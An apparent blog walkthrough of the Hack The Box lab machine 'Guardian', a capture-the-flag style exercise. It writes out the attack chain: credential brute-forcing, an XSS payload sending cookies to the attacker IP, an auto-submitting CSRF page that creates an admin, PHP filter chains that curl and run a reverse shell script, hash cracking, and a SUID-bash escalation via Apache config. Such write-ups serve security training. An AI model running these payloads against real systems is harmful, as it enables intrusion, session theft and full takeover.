---
title: Guardian — HTB
author: Radeel Ahmad
pubDatetime: 2025-09-02T09:32:00Z
tags:
  - hacking
  - HTB
  - IDOR
  - XSS
  - LFI
  - RCE
description:
  Hack The Box "Guardian" walkthrough — subdomain fuzzing, credential brute-forcing, an IDOR chat leak, stored XSS in PhpSpreadsheet, a CSRF admin-creation exploit, LFI-to-RCE via PHP filter chains, and sudo privilege escalation to root.
---

### Guardian — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**Guardian**'.

![](/blog/images/htb/1*yjkC87TXIcDZFyROastgyw.png)

Nmap Scan:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ nmap -sV -sC 10.10.11.84
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 09:32 UTC
Nmap scan report for 10.10.11.84
Host is up (0.37s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
80/tcp   open     http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://guardian.htb/
9999/tcp filtered abyss
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1132.47 seconds
```

Update `etc/hosts`:

```
10.10.11.84 guardian.htb
```

![](/blog/images/htb/1*3ue8A5ECpgObQeZiy6zwNw.png)

fuzz subdomains:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.11.84 -H "Host: FUZZ.guardian.htb" -mc 302

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.84
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Header           : Host: FUZZ.guardian.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 302
________________________________________________

portal                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 372ms]
```

Now update `etc/hosts`:

```
10.10.11.84 portal.guardian.htb
```

![](/blog/images/htb/1*Y6pxqA3pzTSy4mCjc7WOrw.png)

When we click on Help, a PDF file is downloaded. In this file, we can see the default password.

![](/blog/images/htb/1*8DScL5gz2THQoPEJIdRr_A.png)

> We analyzed the source code of the Guardian University login page. The page uses a simple **POST** to `/login.php`.

![](/blog/images/htb/1*VOhHbE1khwVSIqKMGJaWGw.png)

> Now we know in which format the username has to be GU and we have a standard password **GU1234**

```
for y in {2023..2024}; do for i in {0..999}; do printf "GU%03d%s\n" "$i" "$y"; done; done > gu_wordlist.txt
```

Brute-force:

```
hydra -L gu_wordlist.txt -p GU1234 portal.guardian.htb http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password" -V -t 8 -o hydra_results.txt
```

In **hydra_results.txt** we found the valid username `GU0142023`

![](/blog/images/htb/1*fXNn_IH-TQ_qgCksnf22_A.png)

We login:

> Username: GU0142023

> Password: GU1234

![](/blog/images/htb/1*Qd9KPetRQzDqrLBA4-hclw.png)

We explored the website and found a student chat feature with two active conversations. When we clicked on one of the chats, the browser URL changed.

This clearly indicates that the parameters can likely be manipulated to access other chats.

![](/blog/images/htb/1*Z4TUB_FMAq64k4-WyzxxaA.png)

![](/blog/images/htb/1*BknveM-XBiUJxxP6RUlmNQ.png)

We launched a **Cluster Bomb attack** in Burp Suite targeting both `chat_users[0]` and `chat_users[1]` parameters. For each parameter, we selected a number payload list from 1 to 20, allowing us to test all possible chat ID combinations in the range.

The difference in response length observed in Burp indicated valid chats. Accessing one of them exposed sensitive data, including Gitea credentials.

![](/blog/images/htb/1*JgKINZLOZW2uIcp0bdexBw.png)

Update `etc/hosts`:

```
10.10.11.84 gitea.guardian.htb
```

Login with credentials.

![](/blog/images/htb/1*gKMz1gf_woc2qvWVEhe0nw.png)

![](/blog/images/htb/1*NmSbDdu6hGDhwLIEShThGg.png)

We checked `portal.guardian.htb/composer.json` and found that the application uses **PhpSpreadsheet version 3.7.0**, which is known to have a security vulnerability.

![](/blog/images/htb/1*tYrnkfrZ86vXXYq-NqKtiA.png)

**Cross-Site Scripting (XSS) vulnerability in generateNavigation() function** — a zero-day XSS vulnerability disclosed in PhpSpreadsheet.

> We identified that the portal uses PhpSpreadsheet v3.7.0, which is vulnerable to stored XSS.

> We created a malicious .xlsx file with an XSS payload in the sheet name.

> After uploading the file, the payload executed when a lecturer viewed it, exfiltrating their session cookie to our controlled server and granting us authenticated access.

#### Payload:

```
<script>fetch('http://10.10.14.37:8080/log?c='+document.cookie)</script>
```

**Visit:** https://www.treegrid.com/FSheet

- Create a new sheet.
- Put the Payload there to steal the cookie
- Export to **cookie_stealer.xlsx**

![](/blog/images/htb/1*tFUttFOfiYUSpbEXo_bJiQ.png)

Start Python server:

```
python3 -m http.server 8080
```

We uploaded the **cookie_stealer.xlsx** there.

![](/blog/images/htb/1*wpP2ysSPXo95cNhUHrP_8w.png)

We got the cookie.

![](/blog/images/htb/1*09lyTcMkmND05PPxhFROHw.png)

#### Lecturer Portal

Navigated to `portal.guardian.htb/login.php` in a web browser (or reused an active session for the student account) and injected the stolen session cookie into the browser.

![](/blog/images/htb/1*ZWtQiNsm1s9D5XhB1soogA.png)

After refresh, We direct to **Lecture Dashboard.**

![](/blog/images/htb/1*1t1auba1QO0b6uRXcfuQOw.png)

- We go to the Notice Board were can create a new Note.
- Right Click Inspect.
- Here we see a valid csrf token.

![](/blog/images/htb/1*_iQaFXLw6lwsOjspexhrCw.png)

![](/blog/images/htb/1*dSckeaPBqcfWneLwgGrt8w.png)

Create `exp.html` (using ChatGPT 😁) and insert the CSRF token into it.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ cat exp.html
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Admin Creation Exploit</title>
 <style>
 body { font-family: Arial, sans-serif; margin: 20px; }
 form { max-width: 400px; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
 input, select { width: 100%; margin: 10px 0; padding: 5px; }
 button { background-color: #4CAF50; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; }
 button:hover { background-color: #45a049; }</style>
</head>
<body>
 <h2>Admin Creation Exploit</h2>
 <form method="POST" action="http://portal.guardian.htb/admin/createuser.php" id="exploitForm">
 <input type="hidden" name="csrf_token" value="2910aa5623292f11bb17c84ad2f4eb26">
 <input type="hidden" name="username" value="zero">
 <input type="hidden" name="password" value="pa$$w0rd">
 <input type="hidden" name="full_name" value="New Admin">
 <input type="hidden" name="email" value="admin@domain.com">
 <input type="hidden" name="dob" value="1990-01-01">
 <input type="hidden" name="address" value="Admin Address">
 <input type="hidden" name="user_role" value="admin">
 <button type="submit">Create Admin Account</button>
 </form>
 <script>
 // Automatically submit the form
 document.getElementById('exploitForm').submit();</script>
</body>
</html>
```

- Start a Python Webserver
- Create a notice and set a link to our html File

![](/blog/images/htb/1*C5OZvbBVFnJfjHP69PIQXQ.png)

The administrator opened the link and our **exp.html** was triggered.

![](/blog/images/htb/1*hsJDsN-XyH5LNGgceQkkWw.png)

We login with the user we have put in exp.html

- **User**: zero
- **Password**: pa$$word

![](/blog/images/htb/1*BnlM1TSNqgo1byZbPYdqDA.png)

#### Admin Dashboard

![](/blog/images/htb/1*uTkYD_ZCkZcpzXxDme_l3g.png)

- We go to `http://portal.guardian.htb/admin/reports.php`
- We open a Report (Enrollement Report).
- Then it opens `http://portal.guardian.htb/admin/reports.php?report=reports/enrollment.php`
- Looks like we have an **LFI Vulnerability**

**Local File Inclusion to Remote Code Execution (RCE)** — chaining LFI with PHP filter chains to achieve RCE.

Start listener and Python server.

```
nc -lvnp 4444
python3 -m http.server 80
```

- We clone **php_filter_chain_generator** repo
- We generate a PHP filter chain payload
- We generate a PHP payload to chmod shell.sh
- We generate a PHP payload to execute shell.sh

```
git clone https://github.com/synacktiv/php_filter_chain_generator.git
python3 php_filter_chain_generator.py --chain '<?php system("curl 10.10.14.37/shell.sh -o /tmp/shell.sh");?>'
python3 php_filter_chain_generator.py --chain '<?php system("chmod +x /tmp/shell.sh");?>'
python3 php_filter_chain_generator.py --chain '<?php system("/bin/bash -c /tmp/shell.sh");?>'
```

The Server downloads the **shell.sh** and we got a shell back.

![](/blog/images/htb/1*HklDdkApxKO9LqAH3NP80w.png)

We got the username and password for the MySQL database

```
cat /var/www/portal.guardian.htb/config/config.php
```

We access MySQL as root

```
mysql -u root -p
show databases;
use guardiandb;
show tables;
SELECT * FROM users;
```

Hash:

```
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS
c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6:8Sb)tM1vs1SS
7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61:8Sb)tM1vs1SS
4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471:8Sb)tM1vs1SS
23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6:8Sb)tM1vs1SS
c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2:8Sb)tM1vs1SS
9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75:8Sb)tM1vs1SS
ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4:8Sb)tM1vs1SS
18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3:8Sb)tM1vs1SS
b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a:8Sb)tM1vs1SS
```

Two hashes successfully cracked.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ hashcat -m 1410 -a 0 hash /usr/share/wordlists/rockyou.txt

c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56

694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
```

> admin: fakebake000

> jamil: copperhouse56

We connect via SSH as Jamil

```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ssh jamil@10.10.11.84

jamil@10.10.11.84's password:
jamil@guardian:~$ ls
user.txt
jamil@guardian:~$ cat user.txt
b4841faad3be0069************
```

---

### ROOT Flag:

We check sudo privileges

> The script imports modules from `utils/`: `status.py`, `backup-db`, `zip-attachments`, `collect-logs`, `system-status`, `mark`

```
jamil@guardian:~$sudo -l
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
jamil@guardian:~$cat /opt/scripts/utilities/utilities.py
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status

def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ], help="Action to perform")

    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        db.backup_database()
    elif args.action == "zip-attachments":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        attachments.zip_attachments()
    elif args.action == "collect-logs":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        logs.collect_logs()
    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```

- We backdoor **status.py** with a bash shell
- We execute **utilities.py** as mark

```
echo 'import os; os.system("/bin/bash")' > /opt/scripts/utilities/utils/status.py
sudo -u mark /opt/scripts/utilities/utilities.py system-status
```

Create file:

```
nano /home/mark/confs/root.conf
```

```
ServerName localhost

# Load a valid MPM so Apache doesn't complain
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so

# Redirect logs into a command that gives us a SUID bash
ErrorLog "|/bin/sh -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'"

# Prevent binding errors
Listen 127.0.0.1:8080
```

- We start Apache with malicious config
- We spawn root shell with rootbash

```
mark@guardian:/home/jamil$sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/root.conf
mark@guardian:/home/jamil$/tmp/rootbash -p
rootbash-5.1# cat /root/root.txt
d233332a9e9*****************
rootbash-5.1#
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
